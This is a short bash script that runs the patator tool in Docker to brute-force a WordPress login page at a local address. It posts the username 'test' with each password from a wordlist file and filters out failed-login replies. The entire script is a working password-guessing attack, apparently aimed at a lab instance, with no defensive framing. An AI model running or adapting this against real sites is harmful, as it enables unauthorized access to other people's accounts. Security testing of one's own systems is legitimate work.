#!/usr/bin/env bash

pass='/tmp/pass.txt'
url='http://127.0.0.1:9999/wp-login.php'
ignore='is incorrect'

docker run --rm -i -v $pass:/F0 \
patator http_fuzz url=$url method=POST \
body='log=test&pwd=FILE0' 0=/F0 \
-x ignore:fgrep="$ignore"
